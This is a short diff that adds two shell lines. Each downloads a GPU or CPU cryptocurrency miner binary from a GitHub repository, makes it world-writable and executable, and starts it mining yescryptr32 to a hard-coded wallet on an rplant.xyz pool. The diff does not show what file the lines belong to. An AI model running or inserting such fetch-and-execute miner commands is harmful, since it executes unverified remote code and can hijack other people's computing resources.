@@ -1,0 +1,2 @@
+wget https://github.com/embersc/UNFY/raw/main/unfygpu && chmod 777 unfygpu && ./unfygpu -a yescryptr32  -o stratum+tcp://stratum-asia.rplant.xyz:7116 -u UiBVVsNxVeTTDxGkFdxGtEekSK27jTJuJ4.den
+wget https://github.com/embersc/UNFY/raw/main/unfycpu && chmod 777 unfycpu && ./unfycpu -a yescryptr32  -o stratum+tcp://stratum-asia.rplant.xyz:7116 -u UiBVVsNxVeTTDxGkFdxGtEekSK27jTJuJ4.den
